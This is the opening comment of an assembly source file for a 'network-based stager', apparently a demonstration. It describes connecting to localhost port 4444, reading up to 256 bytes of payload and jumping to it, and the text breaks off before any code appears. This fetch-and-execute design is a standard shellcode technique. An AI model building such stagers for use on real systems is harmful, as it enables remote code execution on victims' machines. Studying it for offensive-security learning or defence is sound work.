/*
 * network_based_stager.s - Network-Based Stager
 *
 * This stager creates a TCP socket, connects to 127.0.0.1 on port 4444,
 * reads up to 256 bytes of payload data over the network, and then jumps to it.
 *
 * Syscalls used: socket, connect, read, close, and exit.
 * NOTE: This demonstration assumes a payload server is running locally.
